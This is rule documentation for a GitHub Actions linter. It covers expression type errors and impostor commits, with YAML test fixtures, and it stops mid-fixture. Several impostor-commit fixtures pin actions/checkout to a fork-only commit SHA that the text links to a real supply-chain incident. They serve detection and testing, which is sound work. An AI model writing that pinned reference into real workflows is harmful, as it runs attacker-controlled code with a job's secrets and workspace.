## expression

- problem: a \${{ }} that GitHub accepts in the file does not work when the workflow runs: the value of the \${{ }} has a type that the key of the \${{ }} does not take, a call of format(), case() or fromJSON() in the \${{ }} fails, the value of a \${{ }} in a text is an object or an array (the text of an if is the rule cond's, not this rule's), or the \${{ }} reads a configuration variable by a name that no level of GitHub can define
- expected: every expression that is the whole value of a key (\${{ x }} alone) gives a type that the key takes, every call of format(), case() and fromJSON() gets arguments that the function can use, and every expression written in a text (with other text, or with another \${{ }}, in the same value) gives a string, a number, a boolean or null; the whole text is a string, so the key of such a text takes a string; and every name read from vars is a name that GitHub lets a level define
- targets: workflow, action-metadata
- quality rule: a finding of the quality rule alone gives no attacker a gain, and the findings of the quality rule set no bit of the exit code
- default run: always: in a run without --rule, the rule runs unless --skip-rule names the rule

### finding kinds

- expression.embedded-object
  - detected: the expression {expression} is written in a text, with other text or another expression in the same value, and the expression gives an object or an array
  - arguments:
    - {expression}: The \${{ }}, as written.
    - {value_types}: The types that the value of the \${{ }} may be: an object, an array, or both. (not in the text of detected)
  - consequence: GitHub writes the text Object in place of an object and the text Array in place of an array, not the content of the value, so the text does not hold the value
  - remedy: write the property of the object that holds the value, such as github.event.pull_request.number in place of github.event.pull_request; or toJSON(...) of the value, which gives the value as JSON; or join(...) of an array, such as join(github.event.pull_request.labels.\*.name, ', '). In a run script, put such an expression in env of the step and read the variable in the script, since a value that \${{ }} writes into a script becomes part of the code of the script (the rule code-injection reports a value of an attacker there)
  - true positives:
    - embedded-object.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/expression-remote, which the fact
      #   workflow.definition answers with the workflow of the true positive
      #   embedded-object (embedded-object.yml) of the rule, with on:
      #   workflow_call in place of the on of embedded-object.yml. The job passes
      #   its secrets with secrets: inherit. In the true positive, a step prints
      #   the names of the labels of the pull request with
      #   github.event.pull_request.labels.*.name in the text of run.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: the
      #   value of the ${{ }} is an array, and GitHub writes the text Array in
      #   place of the names: the step prints labels=Array.
      on: pull_request
      permissions: {contents: read}
      jobs:
        c:
          uses: example-org/expression-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - embedded-object.yml (workflow, true-positive)
      ```yaml
      # situation: a step prints the names of the labels of the pull request with
      #   github.event.pull_request.labels.*.name in the text of run.
      # reason: the value of the ${{ }} is an array, and GitHub writes the text
      #   Array in place of the names: the step prints labels=Array.
      on: pull_request
      permissions: {contents: read}
      jobs:
        labels:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: echo "labels=${{ github.event.pull_request.labels.*.name }}"
      ```
  - true negatives:
    - embedded-object.yml (workflow, true-negative)
      ```yaml
      # situation: a step prints the names of the labels of the pull request with
      #   join() of github.event.pull_request.labels.*.name.
      # reason: join() gives a string, which the text holds.
      on: pull_request
      permissions: {contents: read}
      jobs:
        labels:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: echo "labels=${{ join(github.event.pull_request.labels.*.name, ', ') }}"
      ```
- expression.failed-job
  - detected: the expression {expression} of {key} {error}
  - arguments:
    - {expression}: The \${{ }}, as written.
    - {key}: The key.
    - {error}: Why the \${{ }} fails.
    - {value_types}: The types that the value of the \${{ }} may be, for the error value-type; empty for the other errors. (not in the text of detected)
  - consequence: the jobs that need a failed job do not run, and the run fails. For env of the workflow, every job of the workflow fails before the first step of the job runs. For env, the container, the services and defaults.run of a job, that job fails before the first step of that job runs. For the secrets that a job gives a called workflow, the jobs of the called workflow fail before their first steps run. For the outputs and environment.url of a job, that job fails after the steps of that job ran. For the value of an output of workflow_call, the jobs of the called workflow succeed, and the jobs that need the job that calls the workflow do not run
  - remedy: write the expression so that the expression gives a value of a type that the place of the expression takes, and so that each function gets arguments that the function can use: fromJSON(...) turns a string such as 'true' or '5' into a boolean or a number; a property of an object whose value is a string, or toJSON(...) of the object, gives a string; format() needs an argument for each placeholder of its format string; each predicate of case() needs to be a boolean, such as a comparison; fromJSON() needs a string, not an object or an array
  - true positives:
    - failed-job.yml (workflow, true-positive)
      ```yaml
      # situation: the env of the job is a configuration variable, vars.BUILD_ENV,
      #   which holds the variables as JSON.
      # reason: env takes a mapping, and the value is a string: the runner fails
      #   the job at Set up job, before any step runs.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          env: ${{ vars.BUILD_ENV }}
          steps:
            - run: make
      ```
  - true negatives:
    - failed-job.yml (workflow, true-negative)
      ```yaml
      # situation: the env of the job is fromJSON() of a configuration variable,
      #   vars.BUILD_ENV, which holds the variables as JSON.
      # reason: fromJSON() turns the JSON into an object, which env takes.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          env: ${{ fromJSON(vars.BUILD_ENV) }}
          steps:
            - run: make
      ```
- expression.failed-step
  - detected: the expression {expression} of {key} {error}
  - arguments:
    - {expression}: The \${{ }}, as written.
    - {key}: The key.
    - {error}: Why the \${{ }} fails.
    - {value_types}: The types that the value of the \${{ }} may be, for the error value-type; empty for the other errors. (not in the text of detected)
  - consequence: the runner fails the step, also when the key is the if of the step; unless continue-on-error of the step is true, the job fails, and the later steps of the job do not run, except the steps whose if calls a status function such as always() or failure(). For the value of an output of an action.yml, the finding is at outputs.&lt;id>.value of the action.yml, and the step of a workflow that runs the action fails
  - remedy: write the expression so that the expression gives a value of a type that the place of the expression takes, and so that each function gets arguments that the function can use: fromJSON(...) turns a string such as 'true' or '5' into a boolean or a number; a property of an object whose value is a string, or toJSON(...) of the object, gives a string; format() needs an argument for each placeholder of its format string; each predicate of case() needs to be a boolean, such as a comparison; fromJSON() needs a string, not an object or an array
  - true positives:
    - failed-step.yml (workflow, true-positive)
      ```yaml
      # situation: the matrix gives node an object of a version, and a step gives
      #   the input node-version the whole object, matrix.node.
      # reason: the input node-version under with takes a string, and the value
      #   is an object: the runner fails the step.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          strategy:
            matrix:
              node: [{version: 20}, {version: 22}]
          steps:
            - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
              with:
                node-version: ${{ matrix.node }}
      ```
  - true negatives:
    - failed-step.yml (workflow, true-negative)
      ```yaml
      # situation: the matrix gives node an object of a version, and a step gives
      #   the input node-version the version, matrix.node.version.
      # reason: the version is a number, which with takes as a string.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          strategy:
            matrix:
              node: [{version: 20}, {version: 22}]
          steps:
            - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
              with:
                node-version: ${{ matrix.node.version }}
      ```
- expression.ignored-setting
  - detected: the expression {expression} of {key} {error}
  - arguments:
    - {expression}: The \${{ }}, as written.
    - {key}: The key.
    - {error}: Why the \${{ }} fails.
    - {value_types}: The types that the value of the \${{ }} may be, for the error value-type; empty for the other errors. (not in the text of detected)
  - consequence: the runner does not use the key. With timeout-minutes, the runner writes an error to the run when the step starts, and the step has no time limit of the step (the time limit of the job still holds). With continue-on-error, when the step fails, the runner writes an error to the run, and the failure of the step fails the job; when the step succeeds, nothing shows the error
  - remedy: write the expression so that the expression gives a value of a type that the place of the expression takes, and so that each function gets arguments that the function can use: fromJSON(...) turns a string such as 'true' or '5' into a boolean or a number; a property of an object whose value is a string, or toJSON(...) of the object, gives a string; format() needs an argument for each placeholder of its format string; each predicate of case() needs to be a boolean, such as a comparison; fromJSON() needs a string, not an object or an array
  - true positives:
    - ignored-setting.yml (workflow, true-positive)
      ```yaml
      # situation: a step sets continue-on-error to an output of an earlier step,
      #   which is true.
      # reason: an output is a string, and continue-on-error takes a boolean:
      #   when the step fails, the runner writes an error and the job fails.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - id: flaky
              run: echo "allow=true" >> "$GITHUB_OUTPUT"
            - run: make flaky-test
              continue-on-error: ${{ steps.flaky.outputs.allow }}
      ```
  - true negatives:
    - ignored-setting.yml (workflow, true-negative)
      ```yaml
      # situation: a step sets continue-on-error to a comparison of an output of
      #   an earlier step with 'true'.
      # reason: the comparison gives a boolean, which continue-on-error takes.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - id: flaky
              run: echo "allow=true" >> "$GITHUB_OUTPUT"
            - run: make flaky-test
              continue-on-error: ${{ steps.flaky.outputs.allow == 'true' }}
      ```
- expression.undefinable-configuration-variable
  - detected: the expression {expression} reads the configuration variable {name}, a name that no level of GitHub can define: the name of a configuration variable has only ASCII letters, digits and \_, does not start with a digit, and does not start with GITHUB\_ with any of its letters in upper case or lower case
  - arguments:
    - {expression}: The \${{ }}, as written.
    - {name}: The name of the configuration variable, as written.
  - consequence: GitHub accepts the expression and gives the empty string for the reference in every workflow run, so the expression never gives the value of a configuration variable, and a comparison with the value of the reference gives the same result in every workflow run
  - remedy: write the name of a configuration variable that a level defines; the name of a configuration variable must have only ASCII letters, digits and \_, must not start with a digit, and must not start with GITHUB\_ with any of its letters in upper case or lower case
  - true positives:
    - undefinable-configuration-variable.yml (workflow, true-positive)
      ```yaml
      # situation: the steps print vars.GITHUB_X, vars.a-b and vars['1X'], and
      #   the job runs when vars.github_x is empty.
      # reason: GitHub lets no level define a name that starts with GITHUB_ (in
      #   upper case or in lower case), has a character other than ASCII letters,
      #   digits and _, or starts with a digit; in a run that the authors of the
      #   rule made on GitHub, each of the names was the empty string, and the if
      #   was true.
      on: push
      permissions: {contents: read}
      jobs:
        print:
          if: vars.github_x == ''
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: echo "[${{ vars.GITHUB_X }}] [${{ vars.a-b }}] [${{ vars['1X'] }}]"
      ```
  - true negatives:
    - undefinable-configuration-variable.yml (workflow, true-negative)
      ```yaml
      # situation: the step prints vars.GITHUB and vars.GITHUBX.
      # reason: GITHUB and GITHUBX do not start with GITHUB_ (with the _), and
      #   have only letters, so a level can define them.
      on: push
      permissions: {contents: read}
      jobs:
        print:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: echo "[${{ vars.GITHUB }}] [${{ vars.GITHUBX }}]"
      ```
- expression.unstarted-caller
  - detected: the expression {expression} in the key default of an input of workflow_call gives a value of a type other than the type of the input
  - arguments:
    - {expression}: The \${{ }}, as written.
    - {value_types}: The types that the value of the \${{ }} may be, for the error value-type; empty for the other errors. (not in the text of detected)
  - consequence: GitHub does not start a job that calls the workflow: the calling job does not appear in its run, and the run fails. This holds also when the calling job gives the input a value under its key with, and when the input is required
  - remedy: write a default of the type of the input: write fromJSON(...) to turn a string such as 'true' or '5' into a boolean or a number, or write a literal value of the type of the input, such as true or 5, without \${{ }}
  - true positives:
    - .github/workflows/called.yml (workflow, true-positive)
      ```yaml
      # situation: the boolean input dry-run of the reusable workflow has the
      #   default vars.DRY_RUN, a configuration variable.
      # reason: a configuration variable is a string, which is not the type of
      #   the input: GitHub does not start a job that calls the workflow, with or
      #   without the input.
      on:
        workflow_call:
          inputs:
            dry-run:
              type: boolean
              default: ${{ vars.DRY_RUN }}
      permissions: {contents: read}
      jobs:
        deploy:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: ./deploy.sh
      ```
      - .github/workflows/ci.yml (workflow)
        ```yaml
        on: push
        permissions: {contents: read}
        jobs:
          deploy:
            uses: ./.github/workflows/called.yml
        ```
  - true negatives:
    - .github/workflows/called.yml (workflow, true-negative)
      ```yaml
      # situation: the boolean input dry-run of the reusable workflow has the
      #   default vars.DRY_RUN == 'true'.
      # reason: the comparison gives a boolean, the type of the input.
      on:
        workflow_call:
          inputs:
            dry-run:
              type: boolean
              default: ${{ vars.DRY_RUN == 'true' }}
      permissions: {contents: read}
      jobs:
        deploy:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: ./deploy.sh
      ```
      - .github/workflows/ci.yml (workflow)
        ```yaml
        on: push
        permissions: {contents: read}
        jobs:
          deploy:
            uses: ./.github/workflows/called.yml
        ```
- expression.unstarted-job
  - detected: the expression {expression} of {key} {error}
  - arguments:
    - {expression}: The \${{ }}, as written.
    - {key}: The key.
    - {error}: Why the \${{ }} fails.
    - {value_types}: The types that the value of the \${{ }} may be, for the error value-type; empty for the other errors. (not in the text of detected)
  - consequence: GitHub does not run the job. For the if of the job, GitHub skips the job: the job appears in the run as skipped, and the run can succeed. For the other keys of the job, GitHub does not start the job: the job does not appear in the run, the run fails, the jobs that need the job do not run, and the other jobs of the run still run. For run-name and for concurrency of the workflow, GitHub runs no job of the run
  - remedy: write the expression so that the expression gives a value of a type that the place of the expression takes, and so that each function gets arguments that the function can use: fromJSON(...) turns a string such as 'true' or '5' into a boolean or a number; a property of an object whose value is a string, or toJSON(...) of the object, gives a string; format() needs an argument for each placeholder of its format string; each predicate of case() needs to be a boolean, such as a comparison; fromJSON() needs a string, not an object or an array
  - true positives:
    - unstarted-job.remote-call.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls example-org/shared-workflow/.github/workflows/deploy.yml@v1,
      #   a reusable workflow of another repository whose input dry-run is of the
      #   type boolean, and gives the input a configuration variable.
      # reason: a configuration variable is a string, which is not the type of
      #   the input: GitHub does not start the job; workflow.definition answers
      #   the file of the called workflow.
      on: push
      permissions: {contents: read}
      jobs:
        deploy:
          uses: example-org/shared-workflow/.github/workflows/deploy.yml@v1
          with:
            dry-run: ${{ vars.DRY_RUN }}
      ```
    - unstarted-job.yml (workflow, true-positive)
      ```yaml
      # situation: the job sets timeout-minutes to a configuration variable,
      #   vars.TIMEOUT.
      # reason: a configuration variable is a string, and timeout-minutes of a
      #   job takes a number: GitHub does not start the job, even when the value
      #   is 5.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          timeout-minutes: ${{ vars.TIMEOUT }}
          steps:
            - run: make test
      ```
  - true negatives:
    - unstarted-job.yml (workflow, true-negative)
      ```yaml
      # situation: the job sets timeout-minutes to fromJSON() of a configuration
      #   variable, vars.TIMEOUT.
      # reason: fromJSON() turns the string 5 into the number 5, which
      #   timeout-minutes of a job takes. The rule does not know the type that
      #   fromJSON() gives before the run, and reports nothing; the job starts
      #   when the variable holds a number.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          timeout-minutes: ${{ fromJSON(vars.TIMEOUT) }}
          steps:
            - run: make test
      ```

### undetected forms

- unconfirmed-type: a \${{ }} that reads an input of workflow_dispatch of the type choice or environment: the documentation of GitHub does not give the type of the value of such an input, and the authors of the rule did not try the type on GitHub
  - finding kinds: expression.embedded-object, expression.failed-job, expression.failed-step, expression.ignored-setting, expression.undefinable-configuration-variable, expression.unstarted-caller, expression.unstarted-job
  - disposition: todo (needs: fact)
  - example: unconfirmed-type.yml (workflow, undetected)
    ```yaml
    # situation: the job sets timeout-minutes to an input of workflow_dispatch
    #   of the type choice.
    # reason: a value of choice is likely a string, which timeout-minutes of a
    #   job does not take, so GitHub would not start the job.
    # cause: the documentation of GitHub names choice as the type, and the rule
    #   does not know the type of the value.
    on:
      workflow_dispatch:
        inputs:
          minutes:
            type: choice
            options: ['5', '10']
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        timeout-minutes: ${{ inputs.minutes }}
        steps:
          - run: make test
    ```
- event-payload: a \${{ }} that reads a property of github.event, whose type depends on the event, and github.event as the whole value of a key that takes a mapping of known properties, such as runs-on: \${{ github.event }}: the rule does not read the types of the payloads of the events
  - finding kinds: expression.embedded-object, expression.failed-job, expression.failed-step, expression.ignored-setting, expression.undefinable-configuration-variable, expression.unstarted-caller, expression.unstarted-job
  - disposition: todo (needs: same-file)
  - example: event-payload.yml (workflow, undetected)
    ```yaml
    # situation: the job sets runs-on to the whole payload of the event,
    #   github.event.
    # reason: the payload has properties other than group and labels, which
    #   runs-on does not take: GitHub does not start the job.
    # cause: the rule does not know the properties of the payload, which
    #   depend on the event.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ${{ github.event }}
        timeout-minutes: 10
        steps:
          - run: make test
    ```
- run-time-type: a \${{ }} whose type is known only when the workflow runs: fromJSON() of a value that is not a literal, and a \${{ }} whose value may be of a type that the key takes or of a type that the key does not take, such as inputs.t || 30 for an input t of the type string
  - finding kinds: expression.embedded-object, expression.failed-job, expression.failed-step, expression.ignored-setting, expression.undefinable-configuration-variable, expression.unstarted-caller, expression.unstarted-job
  - disposition: limitation (decided by: run-time)
  - example: run-time-type.yml (workflow, undetected)
    ```yaml
    # situation: the job sets timeout-minutes to a property of fromJSON() of a
    #   configuration variable.
    # reason: when the property is a string in the JSON, GitHub does not start
    #   the job.
    # cause: the type of the property is known only when the workflow runs.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        timeout-minutes: ${{ fromJSON(vars.CONFIG).timeout }}
        steps:
          - run: make test
    ```
- remote-call: the with of a job that calls a reusable workflow of another repository when workflow.definition has no answer for the workflow (a run without --online and without the answer in --facts), or a reusable workflow of the repository whose file is not among the files given to the linter: the rule reads the types of the inputs of a called workflow only when the file of the called workflow is among the files given to the linter, or is the answer of workflow.definition
  - finding kinds: expression.embedded-object, expression.failed-job, expression.failed-step, expression.ignored-setting, expression.undefinable-configuration-variable, expression.unstarted-caller, expression.unstarted-job
  - disposition: todo (needs: repo-file, fact)
  - example: remote-call.yml (workflow, undetected)
    ```yaml
    # situation: a job calls a reusable workflow of another repository and
    #   gives an input a configuration variable.
    # reason: when the input is of the type boolean, GitHub does not start the
    #   job, since the value is a string.
    # cause: the run has no answer of workflow.definition for the workflow, and
    #   no one was asked (no --online, no answer in --facts); the rule reads the
    #   types of the inputs of a called workflow only when the file of the
    #   called workflow is among the files given to the linter, or is that
    #   answer.
    on: push
    permissions: {contents: read}
    jobs:
      deploy:
        uses: octo-org/shared/.github/workflows/deploy.yml@0123456789abcdef0123456789abcdef01234567
        with:
          dry-run: ${{ vars.DRY_RUN }}
    ```
- default-call: a call of format(), case() or fromJSON() that fails, in the default of an input of workflow_call: the rule reads the default for its type only, since what GitHub does with such a call in a default was not tried
  - finding kinds: expression.embedded-object, expression.failed-job, expression.failed-step, expression.ignored-setting, expression.undefinable-configuration-variable, expression.unstarted-caller, expression.unstarted-job
  - disposition: todo (needs: same-file)
  - example: default-call.yml (workflow, undetected)
    ```yaml
    # situation: the boolean input dry-run of a reusable workflow has a default
    #   that calls format() with a placeholder and no argument for it.
    # reason: format() fails when GitHub evaluates the default, so GitHub likely
    #   does not start a job that calls the workflow.
    # cause: the rule reads the default of an input for its type only, since
    #   what GitHub does with such a call in a default was not tried.
    on:
      workflow_call:
        inputs:
          dry-run:
            type: boolean
            default: ${{ format('{0}{1}', 'a') == 'a' }}
    permissions: {contents: read}
    jobs:
      deploy:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - run: ./deploy.sh
    ```
- text-value: an expression written in a text (with other text, or with another \${{ }}, in the same value) in a key that takes a boolean, a number or a mapping, such as timeout-minutes: \${{ vars.BASE }}0: the value is a string, which such a key does not take, but the rule reads a text only for an object or an array in it, and what GitHub does with such a value was not tried
  - finding kinds: expression.embedded-object, expression.failed-job, expression.failed-step, expression.ignored-setting, expression.undefinable-configuration-variable, expression.unstarted-caller, expression.unstarted-job
  - disposition: todo (needs: same-file)
  - example: text-value.yml (workflow, undetected)
    ```yaml
    # situation: the job writes timeout-minutes as a configuration variable
    #   followed by the text 0, such as 3 and 0 for 30 minutes.
    # reason: the value is a string, which timeout-minutes of a job does not
    #   take, so GitHub likely does not start the job.
    # cause: the rule reads an expression in a text only for an object or an
    #   array in it, and what GitHub does with such a value was not tried.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ubuntu-latest
        timeout-minutes: ${{ vars.BASE }}0
        steps:
          - run: make test
    ```
- unread-key: a \${{ }} of a key that the rule does not read: runs.env, runs.args and runs.entrypoint of a Docker container action, the default of an input of an action.yml, runs.pre-if and runs.post-if, snapshot of a job, the keys of the container and the services of a job other than image, credentials and env, such as ports and options, deployment of environment, group of a mapping of runs-on, and queue of concurrency
  - finding kinds: expression.embedded-object, expression.failed-job, expression.failed-step, expression.ignored-setting, expression.undefinable-configuration-variable, expression.unstarted-caller, expression.unstarted-job
  - disposition: todo (needs: same-file)
  - example: unread-key.action.yml (action-metadata, undetected)
    ```yaml
    # situation: a Docker container action sets a variable of runs.env to the
    #   whole payload of the event.
    # reason: env takes strings, and the value is an object, so the runner
    #   cannot use the value.
    # cause: the rule does not read runs.env of a Docker container action.
    name: build
    description: build
    runs:
      using: docker
      image: Dockerfile
      env:

    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: expression.embedded-object, expression.failed-job, expression.failed-step, expression.ignored-setting, expression.undefinable-configuration-variable, expression.unstarted-caller, expression.unstarted-job
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/expression-unanswered, whose content is the
    #   workflow of the true positive embedded-object (embedded-object.yml) of
    #   the rule, with on: workflow_call in place of the on of
    #   embedded-object.yml. The linter has no answer of the fact
    #   workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    on: pull_request
    permissions: {}
    jobs:
      c:
        uses: example-org/expression-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- unevaluated-call: a call of format(), case() or fromJSON() that no run evaluates, where the rule does not know so: after an operand of && that is false in every run of the workflow, or after a predicate of case() that is true in every run, such as github.event_name == 'pull_request' && fromJSON(github.event) in a workflow that runs on push only, where the comparison is false in every run. A call that is not evaluated does not fail
  - finding kinds: expression.unstarted-job, expression.failed-job, expression.failed-step, expression.ignored-setting
  - disposition: todo (needs: same-file)
  - example: unevaluated-call.yml (workflow, false-positive)
    ```yaml
    # situation: the workflow runs on push only, and a step prints
    #   github.event_name == 'pull_request' && fromJSON(github.event).
    # reason: the comparison is false in every run, so the runner never
    #   evaluates fromJSON(), which would fail.
    # cause: the rule does not know that the comparison is false in every run.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - run: echo "${{ github.event_name == 'pull_request' && fromJSON(github.event) }}"
    ```

## impostor-commit

- problem: a step's uses is pinned to a full SHA that no branch and no tag of the repository it names has, such as a commit only in a fork
- expected: the SHA is of a commit that a branch or a tag of the repository it names has
- severity: high
- targets: workflow, action-metadata
- facets:
  - weakness: untrusted-reference
  - attack-means: operation
- default run: facts: the rule runs, with all its kinds of findings (also those that need no fact), when --rule names the rule; in a run without --rule, the rule runs when --online is given, or when --facts or --fact gives a found or absent answer to any fact of git.commit-ref

### finding kinds

- impostor-commit.fork-commit
  - detected: {uses} is pinned to a commit that no branch and no tag of {repo} has
  - arguments:
    - {uses}: The uses, as written.
    - {repo}: The repository, owner/name as written.
    - {sha}: A commit, 40 (SHA-1) or 64 (SHA-256) hexadecimal digits. sisakulint writes the digits in lower case. (not in the text of detected)
  - consequence: the step runs the code of a commit that exists only in a fork repository, and any GitHub user can create a fork repository and push commits to the fork repository; when no repository has the commit, the job fails in the step Set up job, and no step of the job runs
  - remedy: pin a commit of a branch or a tag of the repository
  - severity: high (found from the CVSS metrics below by the table)
  - fact kinds: git.commit-ref (provider: github)
  - attackers: forker-of-called
  - preconditions: fork-commit-runs, caller-writes-sha, not-reusable
  - incidents: trivy-2026
  - true positives:
    - fork-commit.no-caller.action.yml (action-metadata, true-positive)
      ```yaml
      # situation: a composite action with no caller among the files that the
      #   linter reads; a step uses actions/checkout by a commit SHA that only a
      #   fork of actions/checkout has.
      # reason: GitHub serves the commits of the forks of a repository under the
      #   name of the repository, so the SHA, which reads as a pin of
      #   actions/checkout, runs code that whoever pushed the commit to the fork
      #   wrote (the Trivy incident, GHSA-69fq-xp46-6x23:
      #   https://github.com/advisories/GHSA-69fq-xp46-6x23).
      # attack: the rule reports the form in which someone pushes a commit to a
      #   fork of actions/checkout and gets the SHA of the commit written in the
      #   action, such as by a pull request from a fork that changes the SHA of the
      #   uses and is merged. Background: in the Trivy incident of 2026-03-19, a
      #   commit pushed with stolen credentials swapped the actions/checkout of a
      #   workflow for the impostor commit 70379aad; the credential premise leaves
      #   the holder of such stolen credentials out of the threat model, but the
      #   workflow that the incident left has the same form.
      # attack-run-behavior: the runner fetches 70379aad by the name
      #   actions/checkout, from the objects the fork network shares, and runs the
      #   action of the commit as the step, in the workspace and environment of the
      #   job; in the Trivy incident the commit was a composite action that
      #   downloaded malicious Go source files from a typosquatted domain.
      name: checkout
      description: check out the repository
      runs:
        using: composite
        steps:
          - uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0
      ```
    - fork-commit.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/impostor-commit-remote, which the fact
      #   workflow.definition answers with the workflow of the true positive
      #   fork-commit (fork-commit.yml) of the rule, with on: workflow_call in
      #   place of the on of fork-commit.yml. The job passes its secrets with
      #   secrets: inherit. In the true positive, a step uses actions/checkout by
      #   a commit SHA that only a fork of actions/checkout has.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: GitHub
      #   serves the commits of a repository's forks under the repository's name,
      #   so the SHA, which reads as a pin of actions/checkout, runs code that
      #   whoever pushed it to the fork wrote (the Trivy incident,
      #   GHSA-69fq-xp46-6x23: https://github.com/advisories/GHSA-69fq-xp46-6x23).
      # attack: the rule reports the form in which someone pushes a commit to
      #   their fork of actions/checkout and gets its SHA written in this
      #   workflow, such as by a pull request from a fork that changes the SHA of
      #   the uses and is merged. Background: in the Trivy incident of 2026-03-19,
      #   a commit pushed with stolen credentials swapped the workflow's
      #   actions/checkout for the impostor commit 70379aad; the credential
      #   premise leaves the holder of such stolen credentials out of the threat
      #   model, but the workflow that the incident left has the same form.
      # attack-run-behavior: the runner fetches 70379aad by the name
      #   actions/checkout, from the objects the fork network shares, and runs its
      #   action as the step, in the job's workspace and environment; in the Trivy
      #   incident it was a composite action that downloaded malicious Go source
      #   files from a typosquatted domain, and the commit was tagged v0.69.4 so
      #   that the release pipeline ran it.
      on: push
      jobs:
        c:
          uses: example-org/impostor-commit-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - fork-commit.yml (workflow, true-positive)
      ```yaml
      # situation: a step uses actions/checkout by a commit SHA that only a fork
      #   of actions/checkout has.
      # reason: GitHub serves the commits of a repository's forks under the
      #   repository's name, so the SHA, which reads as a pin of actions/checkout,
      #   runs code that whoever pushed it to the fork wrote (the Trivy incident,
      #   GHSA-69fq-xp46-6x23: https://github.com/advisories/GHSA-69fq-xp46-6x23).
      # attack: the rule reports the form in which someone pushes a commit to
      #   their fork of actions/checkout and gets its SHA written in this workflow,
      #   such as by a pull request from a fork that changes the SHA of the uses and
      #   is merged. Background: in the Trivy incident of 2026-03-19, a commit
      #   pushed with stolen credentials swapped the workflow's actions/checkout for
      #   the impostor commit 70379aad; the credential premise leaves the holder of
      #   such stolen credentials out of the threat model, but the workflow that the
      #   incident left has the same form.
      # attack-run-behavior: the runner fetches 70379aad by the name
      #   actions/checkout, from the objects the fork network shares, and runs its
      #   action as the step, in the job's workspace and environment; in the Trivy
      #   incident it was a composite action that downloaded malicious Go source
      #   files from a typosquatted domain, and the commit was tagged v0.69.4 so
      #   that the release pipeline ran it.
      # advisory: https://github.com/advisories/GHSA-69fq-xp46-6x23
      on: push
      jobs:
        a:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0
      ```
  - true negatives:
    - fork-commit.never-runs.yml (workflow, true-negative)
      ```yaml
      # situation: on push, the job whose id is disabled has if: false, and the job
      #   whose id is on-failure needs the job build and has if: needs.build.result
      #   == 'failure'; each of the two jobs uses actions/checkout pinned to
      #   70379aad1a8b40919ce8b382d3cd7d0315cde1d0, a commit that only a fork of
      #   actions/checkout has.
      # reason: GitHub skips the job disabled because the if of the job disabled is
      #   false. The if of the job on-failure calls no status function, so GitHub
      #   evaluates the if of the job on-failure only when the job build succeeded;
      #   needs.build.result is then success, and the if is false. When the job
      #   build fails or is skipped, GitHub skips the job on-failure without
      #   evaluating the if. So neither job runs
      #   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/data/reusables/actions/jobs/section-using-conditions-to-control-job-execution.md).
      # attack: an attacker pushes a commit to a fork of actions/checkout that the
      #   attacker owns, and the SHA of the commit is written in this workflow.
      # attack-run-behavior: GitHub skips the job disabled and the job on-failure,
      #   so the runner does not fetch the commit 70379aad, and the code of the
      #   commit does not run.
      on: push
      jobs:
